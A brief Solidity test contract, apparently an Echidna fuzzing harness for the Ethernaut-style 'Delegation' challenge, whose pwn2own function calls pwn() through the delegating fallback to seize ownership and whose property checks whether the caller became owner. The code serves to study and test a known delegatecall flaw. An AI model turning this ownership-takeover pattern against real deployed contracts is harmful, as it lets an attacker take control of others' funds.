pragma solidity ^0.5.0;

import 'contract.sol';

contract Test is Delegation {
  constructor() Delegation(address(new Delegate(msg.sender))) public { }

  function pwn2own() public {
    // this should trigger our fallback fn
    address(this).call(abi.encodeWithSignature("pwn()"));
  }

  function echidna_test_owner() public returns (bool) {
    return owner == msg.sender;
  }
}
